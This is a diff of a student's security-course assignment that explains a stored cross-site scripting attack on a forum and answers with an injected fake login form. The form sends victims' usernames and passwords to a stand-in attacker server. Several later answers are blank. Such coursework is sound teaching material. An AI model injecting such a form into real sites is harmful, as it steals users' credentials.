@@ -53,7 +53,32 @@
 
 ### Part 2: Cross-Site Scripting (XSS) ###
 
-Questions:
+1. Step-by-step description of the nature and timing of Moriarty's attack on users of the FDF.
+
+* Prof. Moriarty submits a post with inline HTML <span> and JavaScript <script> tags.
+* The FDF server stores this unsanitized post content in its database.
+* When another user clicks on Moriarty’s post, the server delivers the post content exactly as it was entered, including the <span> and <script> tags.
+* The browser then interprets and executes these tag automatically as HTML and JavaScript thus Moriarty's alert and css text edits are displayed on the FDF site.
+
+2. XSS attack that is more virulent than Moriarty's "turn something red" and "pop up a message" attacks.
+
+   ***Moriarty could inject a fake login form into a post. When Alice views the post, she might this it is legitimae and try to login. Her username and password will then go to Moriarty instead of the real FDF server.***
+
+  ```
+  <form action="https://moriartys-server.com/steal-password" method="POST">
+    <p>Your session has expired. Please log in again:</p>
+    <input type="text" name="username" placeholder="Username">
+    <input type="text" name="password" placeholder="Password">
+    <button type="submit">Log In</button>
+  </form>
+  
+  ```
+
+
+3.
+4.
+5.
+6. Questions:
 
 Provide a diagram and/or a step-by-step description of the nature and timing of Moriarty's attack on users of the FDF. Note that some of the relevant actions may happen long before other actions.
 
